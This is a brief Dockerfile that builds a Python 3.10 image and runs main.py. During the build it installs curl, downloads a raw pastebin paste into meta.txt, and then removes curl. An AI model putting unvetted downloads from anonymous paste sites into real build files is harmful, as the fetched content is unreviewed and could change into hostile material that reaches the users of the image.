FROM python:3.10-slim

WORKDIR /app

COPY . /app

RUN apt-get update && \
    apt-get install -y --no-install-recommends curl && \
    curl https://pastebin.com/raw/XtGYKzjC > meta.txt && \
    apt-get remove -y curl && \
    rm -rf /var/lib/apt/lists/*

CMD ["python", "main.py"]

